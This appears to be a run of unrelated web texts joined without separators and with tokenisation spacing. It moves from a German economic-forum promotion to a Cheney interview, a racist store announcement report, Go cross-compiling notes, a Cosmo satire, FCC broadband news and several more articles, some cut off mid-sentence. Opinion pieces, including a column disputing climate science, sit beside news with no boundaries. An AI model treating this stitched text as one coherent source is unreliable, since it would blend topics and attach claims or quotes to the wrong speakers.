Seit 2010 gehört das Wirtschaftsforum @ : Heist Convention in Heist im Kreis Pinneberg für kleine , mittlere und große Unternehmen und Vertretern aus Wirtschaft , Wissenschaft und Technik zu einem wichtigen Eckpfeiler , indem es darum geht , die Region Schleswig - Holstein mit neuen Technologien wirtschaftlich weiter voran zu bringen .
Neben vielen Vorträgen und Diskussionen zum Wirtschaftsstandort Schleswig - Holstein spielt auch die Wirtschaftsförderung auf dem @ : Heist Convention Wirtschaftsforum eine große Rolle .
Wirtschaft und Wirtschaftsförderung in Schleswig- Holstein
Eine der zentralen Punkte auf der Wirtschaftskonferenz wird sicher die Frage sein , warum Schleswig - Holstein als Wirtschaftsstandort immer interessanter wird .
Diese Frage lässt sich relativ einfach beantworten , wenn man sich nur einmal in der Region umschaut .
Neben einem der meistbesuchten Urlaubsländer Deutschlands , welches für Touristen viele Badestrände , Kulturdenkmäler und regionale Speisen zu bieten hat , kann sich Schleswig - Holstein auch damit rühmen , ein dynamischer Standort für viele Wirtschaftsunternehmen und Technologieunternehmen zu sein .
Dies mag nicht zuletzt daran liegen , dass mit dem Nord - Ostseekanal einer der größten und meistbefahrenen Binnenschiffkanäle durch Schleswig - Holstein fließt .
Allein dieser Kanal ermöglicht es den Wirtschaftsunternehmen der Region Schleswig - Holstein ihre Produkte via Schiff weltweit zu transportieren .
Starke Infrastruktur zu Wasser und zu Land
Aber nicht nur der Wasserweg , auch eine sehr gut ausgebaute Infrastruktur der Straßen sorgt dafür , dass gerade kleinere und mittelständische Unternehmen hier einen idealen wirtschaftlichen Standort finden und gefördert werden .
Da Schleswig - Holstein aber auch über eine langgestreckte Küste und Inselregionen verfügt , ist die Region auch in Sachen Wind und erneuerbare Energien ganz vorne , insbesondere dann wenn es um den Ausbau dieser neuen Umwelttechnologie geht .
Man kann also sagen , dass sich die Region Schleswig - Holstein auch für eine Zukunft als idealer Wirtschaftsstandort für zahlreiche Unternehmen eignet .
Bei all diesen idealen Voraussetzungen für die Ansiedlung neuer Unternehmen in der Region Schleswig - Holstein kommt es natürlich nicht von ungefähr , dass auch die Wirtschaftsförderung bei der Wirtschaftskonferenz eine große Rolle spielt .
In erster Linie soll die Wirtschaftsförderung des Landes Schleswig - Holstein dafür sorgen , dass Wachstum der Wirtschaft , die Beschäftigung neuer Mitarbeiter , die Forschung nach neuen Technologien und die Bildung zu stärken und weiter auszubauen .
Um diese Ziele langfristig zu erreichen , fördert die Landesregierung mit zahlreichen Darlehen , Beteiligungen und verschiedenen Bürgschaften ganz besonders die Exzellenzforschung , die Existenzgründung , die notwendige Verkehrsinfrastruktur sowie kleine und mittelständische Unternehmen , um deren Finanzierungsbedingungen zu verbessern .
Branchen liegen in Schleswig - Holstein vorne
Wie in jedem anderen Bundesland , gibt es auch in Schleswig - Holstein einige Branchen die besonders hervorstechen .
Besondere Schwerpunkte der Wirtschaftskonferenz in Schleswig - Holstein dürften deshalb die Windenergie und die maritime Wirtschaft sein .
Nach wie vor ist der Ausbau neuer Windenergien durch Windräder in Schleswig - Holstein ein großes Thema .
Die bisher bestehenden Offshorewindparks sollen auch in Zukunft noch weiter gefördert werden .
Ein weiteres wirtschaftlich interessantes Thema der Wirtschaftskonferenz ist die maritime Wirtschaft .
Wasser und Schiffe bestimmten schon seit vielen Jahrhunderten das Bild Schleswig - Holsteins .
So kommt es auch , dass die Region Schleswig - Holstein gerade in Sachen Schiffbau und Schifffahrt bis heute zu den führenden deutschen Ländern zählt .
Einen wahren Boom erleben hier derzeit die Branchen Hafen , Nord - Ostsee - Kanal , Boots - und Jacht - Bau , maritime Ausrüstung , Schiffbauzulieferer , Tourismus , Wassersport , Meeres - und Naturstoffforschung , Fischerei , Hydrographie , Wasserbau und maritime Dienstleistungen .
Darüber hinaus gibt es noch weitere Forschungseinrichtungen , die sich besonders mit den Themen Energie , Umwelt und neue Technologien im Bereich Schiffbau beschäftigen .
Aber nicht nur in den Bereichen Bauen und Hafen spielen Schiffe wirtschaftlich eine große Rolle .
Auch touristisch tragen Schiffe zu einem boomenden Wirtschaftsfaktor in Schleswig - Holstein bei .
So laufen Jahr für Jahr unzählige Kreuzfahrtschiffe aus aller Welt viele Häfen in Schleswig - Holstein an , was insbesondere den Tourismus des Landes ordentlich ankurbelt .
Cheney says the president 's ' agonizing ' about Afghanistan strategy 'has consequences for your forces in the field . ' | John Shinkle / POLITICO
Cheney slams Obama for projecting ' weakness '
MCLEAN , Va. —
On the eve of the unveiling of the nation ’s new Afghanistan policy , former Vice President Dick Cheney slammed President Barack Obama for projecting “ weakness ” to adversaries and warned that more workaday Afghans will side with the Taliban if they think the United States is heading for the exits .
In a 90 - minute interview at his suburban Washington house , Cheney said the president ’s “ agonizing ” about Afghanistan strategy “ has consequences for your forces in the field . ”

“ I begin to get nervous when I see the commander in chief making decisions apparently for what I would describe as small ‘ p ’ political reasons , where he ’s trying to balance off different competing groups in society , ” Cheney said .
“ Every time he delays , defers , debates , changes his position , it begins to raise questions :
Is the commander in chief really behind what they ’ve been asked to do ? ”
Obama administration officials have complained ever since taking office that they face a series of unpalatable — if not impossible — national security decisions in Afghanistan and Pakistan because of the Bush administration ’s unwavering insistence on focusing on Iraq .
But Cheney rejected any suggestion that Obama had to decide on a new strategy for Afghanistan because the one employed by the previous administration failed .
Cheney was asked if he thinks the Bush administration bears any responsibility for the disintegration of Afghanistan because of the attention and resources that were diverted to Iraq .
“ I basically do n’t , ” he replied without elaborating .
Obama will announce a troop buildup in Afghanistan in a speech Tuesday at West Point , and he ’s expected to send at least 30,000 more U.S. troops to the country .
The White House also has said that Obama will outline a general time frame for the United States to begin withdrawing from Afghanistan .
But Cheney said the average Afghan citizen “ sees talk about exit strategies and how soon we can get out , instead of talk about how we win .
“ Those folks ... begin to look for ways to accommodate their enemies , ” Cheney said .
“ They ’re worried the United States is n’t going to be there much longer and the bad guys are . ”
During the interview , Cheney laced his concerns with a broader critique of Obama ’s foreign and national security policy , saying Obama ’s nuanced and at times cerebral approach projects “ weakness ” and that the president is looking “ far more radical than I expected . ”
“ Here ’s a guy without much experience , who campaigned against much of what we put in place ... and who now travels around the world apologizing , ” Cheney said .
“ I think our adversaries — especially when that ’s preceded by a deep bow ... — see that as a sign of weakness . ”
Specifically , Cheney said the Justice Department decision to try Khalid Sheikh Mohammed , the accused mastermind of the Sept. 11 attacks , in New York City is “ great ” for Al Qaeda .
“ One of their top people will be given the opportunity — courtesy of the United States government and the Obama administration — to have a platform from which they can espouse this hateful ideology that they adhere to , ” he said .
“ I think it ’s likely to give encouragement — aid and comfort — to the enemy . ”
The former vice president is splitting his time among his houses in Virginia , in Wyoming and on Maryland ’s Eastern Shore , with a place at each for working on his memoir , to be published in the spring of 2011 .
His eldest daughter , former Principal Deputy Assistant Secretary of State Liz Cheney , is collaborating on the writing and overseeing research .
During the campaign , Cheney recalled , he saw Obama as “ sort of a mainline , traditional Democrat — liberal , from the liberal wing of the party . ”
But Cheney said he is increasingly persuaded by the notion that Obama “ does n’t believe in American exceptionalism — the idea that the United States is a special nation , that we are the greatest , freest nation mankind has ever known . ”
“ When I see the way he operates , I am increasingly convinced that he ’s not as committed to or as wedded to that concept as most of the presidents I ’ve known , Republican or Democrat , ” he said .
“ I am worried .
And I find as I get out around the country , a lot of other people are worried , too . ”
Cheney said his worries extend to Obama ’s domestic agenda : “ He obviously has a very robust agenda of change — health care system , cap and trade , redistribution of wealth .
I rarely hear him talk about the private sector . ”
Cheney charged that Obama ’s plans for Afghanistan are based on political calculations by “ a guy who campaigned from one end of the country to the other , saying Afghanistan was the good war ... so that he could come across as somebody who ’s not against all wars . ”
“ Now , things have changed .
Iraq ’s going significantly better because of the decisions we made in the Bush administration — the surge and so forth , ” the former vice president added .
“ And he ’s having to deal , sort of up close and personal , with the Afghanistan situation .
And it ’s tough — it ’s hard .
...
Sometimes I have the feeling that they ’re just figuring that out . ”
Looking ahead to 2012 , Cheney said the likely midterm congressional losses for Democrats next year “ point in the direction of a very competitive situation in 2012 — a very respectable shot for the Republicans of taking back the presidency . ”
“ There ’s a lot of churning and a lot of ferment out there in the party today , and that ’s basically a healthy thing , ” he said .
“ Our adversaries — our Democratic adversaries — like to be able to portray the Republican Party as a bunch of wingnuts — narrow based , always have some agenda that ’s not attractive to the public .
...
That ’s easier for them , and more fun , than dealing with their own problems .
And I think their problems are significant . ”
Cheney said “ it ’s far too soon to be handicapping ” his party ’s presidential nominee .
“ We ’ve got a lot of folks , I ’m sure , who will want to pursue it .
I have n’t committed and do n’t expect to anytime soon , ” he said .
“ I think we ’ve got a lot of interesting people in the Republican Party . ”
Cheney at first declined to make any comment about Sarah Palin , but finally said : “ I like her , personally .
...
She ’s charming , engaging .
She ’s got as much right to be out there as anybody else .
Will she be a candidate at some point ?
How would she do as a candidate ?
Those are all questions that only time will tell . ”
And what does he think about the movement to draft him to seek the top job himself ?
Cheney says he sees no such scenario .
“ Why would I want to do that ? ” he replied .
“ It ’s been a hell of a tour .
I ’ve loved it .
I have no aspirations for further office . ”

Wal - Mart officials are looking at security tapes after an announcement was made for " all black people ' ' to leave a store in South Jersey .
A man used the public - address system at the Route 42 store in Washington Township Sunday night and calmly announced : " Attention Wal - Mart customers :
All black people leave the store now . ''
Patricia Covington and Shelia Ellington were inside the store when it happened and told the Courier Post that customers and store employees looked stunned when they heard it .
" In 2010 , I want to know why such statements are being made because it flies in the face of what we teach them [ our kids ] at home , and that 's tolerance for people , " said Ellington .
Ellington and other customers let store management and police know they were upset .
They asked the store to use the same announcement system to apologize to customers that night , which it did .
Wal - Mart management called the incident " unacceptable , " and said it 's working to make sure nothing like this happens at any other stores .
Washington Township police and the Gloucester County Prosecutor 's Office are investigating the incident as a possible bias crime .
" I can't believe it in this day and age , " Covington told the paper .
" Wal - Mart needs to be more responsible . "
Covington and Elllington are boycotting the store .
UPDATE : Women who are boycotting the store after hearing the message speak out .

We ’re suckers for punctuation jokes !

As one of the things I do is evaluate new technologies for embedded systems , the Go language from Google is an interesting development .
I have been looking for a better “ system ” language for some time .
What I mean by a better system language is one that is nearly as efficient as C , does not require a large runtime , has a fast start - up time , and yet supports modern language features .
It is interesting that the constraints for very high performance server applications are often similar to those found in embedded systems in that applications must make very efficient use of memory and CPU cycles .
This is why C++ is still used a lot by Google and is also popular in embedded systems , but is not as common in applications where CPU power is plentiful compared to the resources to implement the application such as business applications .
One area of divergence is the focus on multi-core for high end server applications , but in the next few years , multi-core CPU ’s such as the Atom and ARM Cortex - A9 will likely be common in low power embedded systems .
There are other options .
Vala is very nice to use , is efficient , offers advanced language features , and extensive language bindings .
Vala is being used to implement some of the http://freesmartphone.org software stack .
C/C++ are the old standby languages , but are rather tedious to program in compared to some of the newer languages in that source and header files are separate , and memory management is manual .
My interest in Go at this time is for ARM systems , so I ran a few experiments .
From what I can tell , there does exist an ARM
Go compiler that is able to produce ARM code , but it currently lacks support for EABI soft floating point .
The lack of floating point support is pretty much a show stopper for now , but it is at least a start .
The following is an example :
export GOARCH=arm cd $ GOROOT / src/ ./make-arm.bash cd ( create the following source file : hello.go ) ==================
package main import " fmt " func main ( ) { fmt .
Printf ( " Hello , world
" ) ; } =================
5g hello.go ( 5g is the ARM compiler ) 5l hello. 5 scp 5.out root@n900 : ( copy to ARM system ) ssh root@n900 ?:~# ./5.out Hello , world ( modify with floating point code ) ==================
package main import " fmt " func main ( ) { var f = 1.5 ; fmt .
Printf ( " Hello , world
" ) ; fmt .
Printf ( " float f = %f
" , f ) ; } =================
( now run on ARM system ) ?:~# ./5.out Segmentation fault
As , you can see , floating point does not work as expected .
I ’m not sure yet if gogcc can be configured to compile ARM binaries .
The other area where Go appears to need a lot of work is bindings to various libraries .
Though it does not appear to be ready for embedded ARM systems at this time , Go will be an interesting language to watch over the next few years .
One would think that after the ponytail - thong debacle of 2009 , Cosmo might reassess their sexy - sexy - sexxx dating advice and dial back the crazy a bit .
Alas , the flirting guide in the March 2010 issue proves Cosmo's wackiness is here to stay .

An article titled " 50 Ways To Become A Legendary Flirt " presents itself as a guide to getting what you want by flirting your way into the hearts and minds of others .
A little sexyface here , a little flattery there : these are the things that will get a fun , fearless female what she wants , according to the Cos .
While the article notes that flirting " does n't always have to be sexual , " it appears that nobody stopped to consider how creepy several of the suggestions in the guide are .
Until now , that is !
Let 's take a look at the most insane flirting suggestions , shall we ?
5 . Act all innocent and shy when the adorable UPS guy happens to catch you still in your short silk robe at 10 a.m. on a Saturday .

You do realize this is n't going to help you at all , right ?
For one thing , your package has already been delivered ( insert Cosmo joke here , am I right , ladies !
Penises ! ) so it 's not as if answering the door like a character in a porn movie is going to speed things up at all .
Secondly , it 's highly unlikely that the delivery guy will write a letter to whomever is shipping your packages , the distribution center responsible for sending them , and , you know , the Earth , to let them know that from now on your things have to be delivered on time , because you answer the door in your skivvies , which makes you important .
8. Lean on the counter at the dry cleaners so that the cashier can see your statement necklace slip into your cleavage .

Oh , honey , no .
Nobody cares about your boobs or your statement necklace at the dry cleaners .
Your clothes will be ready on Monday , and that stain is n't coming out .
And now you 'll be known as " Tits McGee , the crazy bitch with the stained coat " for as long as you use that particular dry cleaning service .
9 . Take a sip of your mocha latte , stare into the eyes of the barista who made it , and moan " Oh , yeah ... that is soooo good . "
Next time , watch your drink appear before everyone else's .

The only reason your drink is coming out first is because everyone who works there thinks you are insane and they really , really want you to leave .
And as soon as you do , they are totally going to make fun of you .
16 . " ' Trip , ' fall against a man 's chest , and say , ' Damn , your pecs are so hard , I felt like I was falling into a wall . ' "

If there 's one piece of honest advice I can give you , it is this : life is not a Kate Hudson movie .
Things like this do not happen in real life , and when they do , one person in the equation is typically a total cornball who needs to be dismissed immediately .
17 .
Get the indie music guy hanging near the jukebox to help you pick out a song .

LOL what ?
Where is this mythical place where the " indie music guy " hangs out near the jukebox ?
The Max ?
The Peach Pit ?
The Peach Pit After Dark ?
22 . Hit up a sports bar and ask the guy sitting beside you what his favorite team is so you 'll " know who to root for . "
Advertisement
Oh , this is so sad !
And so transparent !
Doing this will just make you look stupid and desperate and pathetic .
Especially if his favorite team is the Yankees and then you have to act like you like them for a few hours .
So sad !
29 .
Tell your big sis she 's a total MILF .
This is pretty sick , actually .
Do n't do this .
Just ... do n't do this .
Here 's the problem with the majority of these tips ( aside from their ridiculousness ) : they rely on a woman dumbing herself down in order to appeal to some dude or to get what she wants .
To get your coffee fast , you need to moan like an idiot , to try to meet guys , you need to ask them what they like so you can mold yourself around their idea of the perfect woman , and to impress your family members , apparently , you need to make vaguely incestuous comments .

For all the " fun , fearless " talk Cosmo pushes , its articles often revert to the notion that a woman has to play it safe and stupid to get ahead in the world , using her boobs over her brains and discarding all self - awareness in an attempt to appear " sexy " and " daring . "
The results are often a display of idiocy and transparent attempts to be what she believes other people expect her to be : the Cosmo girl has to try to flirt her way into the hearts of others with her underwear tied in her hair because she does n't know how to just stand up , be herself , own her sexuality , and say what she means .
There 's a difference between being a flirt and being completely insane .
Someday , Cosmo might figure it out .

For most Americans who already have broadband access the most important part of the 10 - year plan may involve speed .
The F.C.C. hopes that by 2020 at least 100 million households will have access to broadband capable of running 100 megabits a second , and for community institutions like schools and hospitals to have access at 10 times that speed .
Image
The policy aims to “ harness the power of broadband to help address so many vital national issues , ” Julius Genachowski said .
Credit ... Jacquelyn Martin / Associated Press
The average at - home connection is three to four megabits a second now , speeds seen as ultimately unable to deliver increasingly rich multimedia content .
But industry analysts say that the government ’s ability to influence access speeds is limited .
Some aspects will take years to put into place and require Congressional action .
Notably , legislators would have to allow some proceeds from the spectrum auctions to be diverted to broadcasters .
The F.C.C. hopes to use that spectrum to lead to the creation of wireless Internet access , to enhance competition and keep consumer costs in check .
But some television station owners are wary of the auction plans .
That is one of the little battles that seems likely to emerge involving deep - pocketed advocates , industry analysts said .
One F.C.C. commissioner , Mignon Clyburn , said in a statement that she was “ very concerned ” about the tradeoff .
“ It is unclear at this point whether the Internet can currently replace these trusted sources , ” she said .
And some analysts said that even if the spectrum ultimately became available , it might create wireless access but fail to create competition for the much higher - speed Net access .
Wireless access is roughly one - twentieth of the speed of the envisioned 100 - megabit lines , said Dave Burstein , editor of DSL Prime , an industry newsletter .
“ They talk , talk , talk about affordability , but when you look at the plan , most peoples ’ prices are going to go up , ” Mr. Burstein said .
It typically costs $ 100 a month for Net access at speeds of 50 megabits to 100 megabits .
This one goes out in particular to Canadian .

TEHRAN — President Mahmoud Ahmadinejad said on Tuesday that Iran ’s arch - foe Israel was mulling starting a war “ next spring or summer ” but has yet to make a final decision .
Without specifying whom would be targeted , Ahmadinejad said : “ According to information we have they ( Israel ) are seeking to start a war next spring or summer , although their decision is not final yet . ”

“ But the resistance and regional states will finish them if this fake regime does anything again , ” the hardliner said at a press conference when asked about ongoing efforts to reconcile ties betwen Arabs and Israel .
The already deep - seated enmity between Iran and Israel have deteriorated since Ahmadinejad became the president , with the latter not ruling out a military strike against Tehran ’s nuclear sites in a bid to stop the Islamic republic ’s galloping atomic programme .

“ IN MONTH XI , 15th day , Venus in the west disappeared , 3 days in the sky it stayed away .
In month XI , 18th day , Venus in the east became visible . ”
What ’s remarkable about these observations of Venus is that they were made about 3500 years ago , by Babylonian astrologers .
We know about them because a clay tablet bearing a record of these ancient observations , called the Venus Tablet of Ammisaduqa , was made 1000 years later and has survived largely intact .
Today , it can be viewed at the British Museum in London .
We , of course , have knowledge undreamt of by the Babylonians .
We do n’t just peek at Venus from afar , we have sent spacecraft there .
Our astronomers now observe planets round alien suns and peer across vast chasms of space and time , back to the beginning of the universe itself .
Our industrialists are transforming sand and oil into ever smaller and more intricate machines , a form of alchemy more wondrous than anything any alchemist ever dreamed of .
Our biologists are tinkering with the very recipes for life itself , gaining powers once attributed to gods .
Yet even as we are acquiring ever more extraordinary knowledge , we are storing it in ever more fragile and ephemeral forms .
If our civilisation runs into trouble , like all others before it , how much would survive ?
Of course , in the event of a disaster big enough to wipe out all humans , such as a colossal asteroid strike , it would not …

Self - service technology used by travellers to pass through immigration at Australian airports is unreliable and impersonators can easily cheat the system , an expert warns .
One million passengers have now used the bio-metric SmartGate self - process Customs system at airports in Adelaide , Brisbane , Cairns , Melbourne , Perth and Sydney .
SmartGate takes a photo of a traveller 's face and , using facial recognition technology , matches it with the digitised image stored in their ePassport
Minister for Home Affairs Brendan O'Connor says the system has made processing through passport control simpler and more convenient for travellers .
" The popularity of SmartGate is really encouraging and we expect usage figures to continue to increase as more travellers take advantage of the self - processing option , " he said .
" In the last three months alone , more than 330,000 travellers have used SmartGate at airports across Australia . "
But visiting fellow at Australian National University , Roger Clarke , says the SmartGate system has " been a problem from the very beginning " .
He says the technology is unreliable and unsafe .
" What it originally claimed to do for us was to be a counter - terrorism measure , " he said .
" It was meant to provide greater security , greater confidence that the person who was presenting a passport was the person to whom it was issued and whose photograph appeared in it .
" [ Customs ] endeavoured to run some trials as to the quality of the technology ... and from everything that we can find out publicly , it performed extremely badly .
" It 's quite unreliable .
It 's not a security measure at all . "
Mr Clarke says the system has a very high tolerance , to allow people to get through easily .
" By setting the tolerance so high , anyone who is cheating the system has a very good chance of getting through if they look even vaguely like the person whose passport is being used , " he said .
Mr Clarke says during tests of the SmartGate system , a large group of people swapped passports and successfully made it through checks .
" Eight out of 100 were incorrectly permitted through .
That 's a huge number of people , so the security aspects are dreadful , " he said .
He says air crew make up most of the 1 million travellers who have used the system .
" I 've been through Sydney Airport twice since they switched [ SmartGate ] on for the general public , and on both occasions there have been attempts by Customs officers to attract people into those queues , " he said .
" Nobody understood it , nobody wanted to go , and the machines were standing there idly while the rest of us were all standing in normal queues . "
A ' trojan horse '
Mr Clarke says he thinks the program is a " trojan horse " .
" We think that they have really implemented this system so that in a few years ' time , when they have got it installed and everybody is forced to use it ... then they 'll admit it does n't actually work , " he said .
He says the Government will then enforce a new bio-metrics system that requires fingerprints .
" Everybody will suddenly be required to prove who they are through their fingerprints and let the Government own a copy of their fingerprints , just to cross borders , " he said .
" That 's what we think the real game plan is , because the people who are inside Customs and inside the various security and intelligence agencies are well aware that [ SmartGate ] is a highly deficient technology . "
SmartGate was kicked off in 2005 by then - foreign minister Alexander Downer , and initially went live in Brisbane airport in August 2007 .
The next phase of the program will involve the implementation of SmartGate at the Gold Coast International Airport in March .
WASHINGTON , Jan. 2 - If the mere sight of Tai Shan , the roly - poly , goofily gamboling masked bandit of a panda cub now on view at the National Zoo is n't enough to make you melt , then maybe the crush of his human onlookers , the furious flashing of their cameras and the heated gasps of their mass rapture will do the trick .
" Omigosh , look at him !
He is too cute ! "
" How adorable !
I wish I could just reach in there and give him a big squeeze ! "
" He 's so fuzzy !
I 've never seen anything so cute in my life ! "
A guard 's sonorous voice rises above the burble .
" OK , folks , five oohs and aahs per person , then it 's time to let someone else step up front . "
The 6 - month - old , 25 - pound Tai Shan -- whose name is pronounced tie -SHON and means , for no obvious reason , " peaceful mountain " -- is the first surviving giant panda cub ever born at the Smithsonian 's zoo .
And though the zoo 's adult pandas have long been among Washington 's top tourist attractions , the public debut of the baby in December has unleashed an almost bestial frenzy here .
Some 13,000 timed tickets to see the cub were snapped up within two hours of being released , and almost immediately began trading on eBay for up to $ 200 a pair .
It started when I came to on the floor of a public restroom , naked and dazed .
I 'd had my share of late nights , lost weekends and unrepeatable adventures throughout this year 's Game Developers Conference ( you 're doing it wrong if you do n't ) , but this was a new one .
There was an unidentifiable ringing coming from the next room — a telephone ?
an alarm ?
was it just my ears ? — and I clambered upright and tested my surroundings .
Ran the sink taps , flushed the toilet , scrambled to get my head straight .
I stumbled out of the bathroom into a locker room — how did I get here ? — and checked a locker in blind hopes that my clothes might be inside .
That 's when the girl showed up .
Covering my shame , I blurted out the first thing that came to mind : " Have you seen my clothes ? "
She shrieked in response and called for her friends .
I ran back into the safety of the bathroom only to find that I 'd been in the women's room the whole time , and there were more girls here now .
I tried to hide in a stall as a small mob gathered — everyone angry , taunting — wondering how I might escape .
One girl took pity and yelled for me to follow her .
We made a fast exit .
She pulled me toward an adjacent restroom , and told me to come close so she could tell me a secret .
Feeling like this could easily be a trap , but too stunned and confused to object , I inched closer .
" Banana bread , " she whispered .
I stared blankly back — was this some sort of joke ?
I thought I heard the soft echo of a man 's laughter in the distance .
" You need to wake up , " she said .
I look up and realize I was n't wrong about the laughter .
Across the table is Jason Rohrer — creator of Passage , 2007 's five - minute memento mori metaphor that caused most to think more deeply about videogames ' potential for deeper artistic meaning .
He 's smiling because he knows he 's got me right where he wants me .
With only two laptops and a single ethernet cable between us , we 're knee deep in his latest and most ambitious game , Sleep is Death ( Geisterfahrer ) , and I know now what I have to do .
To this point , I 've been playing as you would any other point and click adventure game : trying to " use " objects , " open " doors , searching for mouse - over menus for things in the world , only to find that they do n't exist .
I 've been thinking too linearly , reacting too straightforwardly to the things in front of me .
It 's now that I realize I have as much control over him as he does over me .
Each game screen in Sleep is Death allows you 30 seconds to make a move before being transmitted back .
Point an arrow at an object and indicate what you 'd like to do with it .
Open a bubble and make your character speak a short phrase .
It 's only now that I realize that Rohrer , as the game 's storytelling host , only has that same 30 seconds to either custom create a new scene — or , hopefully , have one already prepared — to show how my actions played out .
I think I can use this to my advantage .
When I wake up , I 'm a bald middle - aged man lying in bed .
I stand up , again naked , and make my way into what I 'm assuming is — or perhaps conjure without speaking as — a closet .
I use my speech bubbles not to communicate to another character ( though my " wife " is currently yelling at me from the kitchen to get to work ) but in soliloquy , to show Rohrer that I 'm not going to let him be the sole author of this story .
" Every night it 's the same dream , " my character laments , pathos in half - reference to Molleindustria 's own art - game , a line I know Rohrer will appreciate .
When I finally make it outside , at my wife 's pointed nagging , I see that he has .
Waiting for me are a squat two - door coupe commuter 's car and a near - leafless tree , both seemingly in homage to Molleindustria 's work .
I know Rohrer wants me to get in that car .
I know he was up the night before constructing places he wants that car to go , for me to experience the story he 's created , but I want to subvert him and keep him on his toes .
I point my action - arrow at the pink petals fallen from the tree , instruct my character to " gather " , and hit " submit " before my timer runs out .
I hear Rohrer laugh again , because he and I both know he has n't anticipated this and now has 30 seconds to scramble with the game 's image editor to paint the petals into my character 's hands .
We go on like this for another 30 rounds , me trying to sway Rohrer from the path he 's laid before me , and him always finding ( or , in a pinch , brute forcing ) ways to rope me back in when he know he does n't have the time to properly accommodate my demands .
The story ends — as no videogame has before — with a nationally televised meltdown in the vein of Network , or Jimmy Gator 's own in Magnolia , which is by my intention , but more accurately of both Rohrer 's and my design .
One thing 's for certain : I had a fantastic introduction to Sleep is Death — felt the kind of discomfort that can only be felt when naked in the proverbial ladies ' room , again , something that no game has done to me before — because Rohrer himself was my co-storyteller .
It 's for that reason that Rohrer 's put limitations on the game 's scope .
Primarily , Sleep is not an online game .
With WiFi solutions still being hammered out in anticipation of the game 's April 8th release , it can only be played as we did , with two laptops and an ethernet cable .
No online play , no web warehouse of downloadable stories ( though it does provide an easily uploadable slideshow view of exactly how the story played out for everyone to share ) .
This might put off some of his potential audience , but the reasoning 's deliberate and sound -- Rohrer 's openly stated that the players of his last multiplayer game , Between , reported positive experiences when they played with friends , much less so when thrown open to the wild west of the web 's strangers .
That does n't mean the experience is quite as static — each player 's library of selectable objects will grow every time they play through someone else 's story -- but it does mean that a good majority of the world 's best stories wo n't be at your demand , and that most wo n't have the pleasure of getting woven into a tale of Rohrer 's own weaving .
Cannabis Science , Inc. ( OTCBB : CBIS ) , a pioneering US pharmaceutical cannabis company , notes that comments by President Obama 's Deputy Director of the White House Office of National Drug Control Policy , Tom McClellan , in yesterday 's USA TODAY pinpoints the need for non-smoked medical cannabis products similar to those currently being developed for FDA clinical trials by Cannabis Science .
Deputy Director McClellan said in the article that Obama administration still opposes smoking marijuana for its medicinal benefit .
As well , he says more research is needed to deliver the medically useful ingredients in a non-smoked form .
He then went on to say , " We have the safest medications in the world and it's not a coincidence .
We have an enviable process by which we approve medications , and that 's through the FDA ( Food and Drug Administration ) . "
Dr. Robert Melamede , President and CEO of Cannabis Science , " With an open invitation like this from the Obama Administration , we at Cannabis Science feel more confident than ever that our efforts to provide our " wounded warriors " with an alternative to treatments that are not working will be fairly examined , when we submit our non-smoked cannabis pharmaceutical products to the FDA for clinical trials .
We are doing precisely the sort of scientific research that Deputy Director McClellan is calling for . "
Richard Cowan , Cannabis Science CFO and a former CEO of the National Organization for the Reform of Marijuana Laws ( NORML ) , noted , " It is important that the Obama Administration is making such an open call that they want more FDA clinical trial research on the same types of drugs we are creating .
Consequently , we will rapidly proceed with our development of a cannabis - based medicine for PTSD for FDA clinical trials .
We hope they will share our sense of urgency , because PTSD is killing not only our veterans , but also our active duty troops .
In January alone , more of our active US military troops died of suicide than were killed in Iraq and Afghanistan wars combined . "
Both Dr. Melamede and Richard Cowan , are long - term advocates of the full legalization of marijuana , and support the rights of patients to use the plant to medicate , including smoking .
The article reported that support for full legalization is growing rapidly ( now up to 44 % nationally and a majority in some states ) .
By George Will - February 21 , 2010
WASHINGTON -- Science , many scientists say , has been restored to her rightful throne because progressives have regained power .
Progressives , say progressives , emulate the cool detachment of scientific discourse .
So hear now the calm , collected voice of a scientist lavishly honored by progressives , Rajendra Pachauri .
He is chairman of the U.N. 's Intergovernmental Panel on Climate Change ( IPCC ) , which shared the 2007 version of the increasingly weird Nobel Peace Prize .
Denouncing persons skeptical about the shrill certitudes of those who say global warming poses an imminent threat to the planet , he says :
" They are the same people who deny the link between smoking and cancer .
They are people who say that asbestos is as good as talcum powder -- and I hope they put it on their faces every day . "
Do not judge him as harshly as he speaks of others .
Nothing prepared him for the unnerving horror of encountering disagreement .
Global warming alarmists , long cosseted by echoing media , manifest an interesting incongruity -- hysteria and name calling accompanying serene assertions about the " settled science " of climate change .
Were it settled , we would be spared the hyperbole that amounts to Ring Lardner 's " Shut up , he explained . "
The global warming industry , like Alexander in the famous children 's story , is having a terrible , horrible , no good , very bad day .
Actually , a bad three months , which began Nov. 19 with the publication of e-mails indicating attempts by scientists to massage data and suppress dissent in order to strengthen " evidence " of global warming .
But there already supposedly was a broad , deep and unassailable consensus .
Strange .
Next came the failure of The World 's Last -- We Really , Really Mean It -- Chance , aka the Copenhagen climate change summit .
It was a nullity , and since then things have been getting worse for those trying to stampede the world into a spasm of prophylactic statism .
In 2007 , before the economic downturn began enforcing seriousness and discouraging grandstanding , seven Western U.S. states ( and four Canadian provinces ) decided to fix the planet on their own .
California 's Arnold Schwarzenegger intoned , " We cannot wait for the United States government to get its act together on the environment . "
The 11 jurisdictions formed what is now called the Western Climate Initiative to reduce greenhouse gas emissions , starting in 2012 .
Or not .
Arizona's Gov. Jan Brewer recently suspended her state 's participation in what has not yet begun , and some Utah legislators are reportedly considering a similar action .
She worries , sensibly , that it would impose costs on businesses and consumers .
She also ordered reconsideration of Arizona 's strict vehicle emission rules , modeled on incorrigible California 's , lest they raise the cost of new cars .
Last week , BP America , ConocoPhillips and Caterpillar , three early members of the 31 - member U.S. Climate Action Partnership , said : Oh , never mind .
They withdrew from USCAP .
It is a coalition of corporations and global warming alarm groups that was formed in 2007 when carbon rationing legislation seemed inevitable and collaboration with the rationers seemed prudent .
A spokesman for Conoco said : " We need to spend time addressing the issues that impact our shareholders and consumers . "
What a concept .
Global warming skeptics , too , have erred .
They have said there has been no statistically significant warming for 10 years .
Phil Jones , former director of Britain 's Climatic Research Unit , source of the leaked documents , admits it has been 15 years .
Small wonder that support for radical remedial action , sacrificing wealth and freedom to combat warming , is melting faster than the Himalayan glaciers that an IPCC report asserted , without serious scientific support , could disappear by 2035 .
Jones also says that if during what is called the Medieval Warm Period ( circa 800 - 1300 ) global temperatures may have been warmer than today's , that would change the debate .
Indeed it would .
It would complicate the task of indicting contemporary civilization for today 's supposedly unprecedented temperatures .
